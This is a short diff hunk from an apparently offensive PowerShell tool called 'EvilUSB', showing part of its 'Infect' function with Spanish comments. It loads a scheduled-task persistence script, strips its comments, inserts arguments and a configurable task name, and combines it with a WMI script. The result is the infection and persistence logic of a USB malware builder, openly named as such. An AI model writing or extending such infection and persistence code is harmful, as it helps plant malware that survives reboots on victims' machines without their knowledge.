@@ -364,7 +364,10 @@ Function EvilUSB:Infect {
 	$ScheduleTaskScriptSource = Get-Content .\data\scripts_source\ScheduleTask-Persistence.ps1
 	# Remover comentarios
 	$ScheduleTaskScriptSource = Remove-Comments $ScheduleTaskScriptSource
+	# Agregar argumentos
 	$ScheduleTaskScriptSource = $ScheduleTaskScriptSource.Replace('$Arguments',$Arguments)
+	# Cambiar nombre de la tarea programada
+	$ScheduleTaskScriptSource = $ScheduleTaskScriptSource.Replace('TaskName','"' + $Global:Settings.Persistence.ScheduleTask.TaskName.Replace('"','') + '"')
 
     $ScriptSource = $WMIScriptSource + $ScheduleTaskScriptSource
 
